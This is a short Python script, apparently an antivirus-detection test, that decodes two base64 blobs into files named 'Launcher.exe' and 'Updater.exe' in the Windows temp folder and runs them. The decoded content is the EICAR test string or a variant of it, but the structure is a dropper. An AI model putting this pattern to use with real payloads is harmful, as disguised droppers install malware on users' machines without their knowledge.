import os
import subprocess as sbp
import time
from base64 import b64decode as b64d
import sys
import subprocess

time.sleep(1)
temp = sbp.check_output("cmd /c echo %temp%").decode().replace("\r\n","")
legit = b'BSVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
with open(f'{temp}\\Launcher.exe', 'wb')as l:
    l.write(b64d(legit))
subprocess.Popen(f"{temp}\\Launcher.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
with open(f"{temp}\\Updater.exe","wb")as f:
    f.write(b64d(b64data))
try:
    subprocess.Popen(f"{temp}\\Updater.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
except:
    sys.exit()
sys.exit()
